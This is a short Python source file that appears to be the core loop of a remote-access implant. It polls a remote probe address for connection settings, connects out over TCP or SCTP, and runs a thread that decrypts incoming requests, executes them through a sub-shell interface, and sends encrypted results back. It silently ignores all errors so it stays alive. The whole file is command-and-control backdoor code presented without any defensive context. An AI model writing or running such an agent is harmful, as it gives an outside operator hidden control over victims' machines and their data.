from toolkit import *

def cmd_callback(sock_configs):

	while True:
		try:
			data = sub_shell.ioctl(['NETCTL',{'cmd':TCP_RECV,'id':sock_configs['id']}])
			output = sub_shell.ioctl(['CRYPTO',{"data":data,'mode':ULCK}])
			request = json.loads(output)
			output = sub_shell.ioctl(request)
			enc_data = sub_shell.ioctl(['CRYPTO',{'data':output,'mode':LOCK}])
			sub_shell.ioctl(['NETCTL',{'cmd':TCP_SEND,'data':enc_data,'id':sock_configs['id']}])

		except Exception as e:
			time.sleep(1)
def main():
	try:

		globals()['AGENT_CONFIGS'] = startup()
		init_load(AGENT_CONFIGS)

		while True:
			data = sub_shell.ioctl(['NPROBE',{'addr':PROBE_REMOTE_ADDRESS}])
			configs = json.loads(data.decode())

			if configs['cmd'] == TCP_COMM_MODE or configs['cmd'] == SCTP_COMM_MODE:
				sub_shell.ioctl(['NETCTL',configs])
				sub_shell.ioctl(['NETCTL',{'cmd':TCP_CONN,'addr':tuple(configs['addr']),'id':configs['id']}])
				cmd_thread = threading.Thread(target=cmd_callback,args=(configs,))
				cmd_thread.start()
	except:
		pass

main()
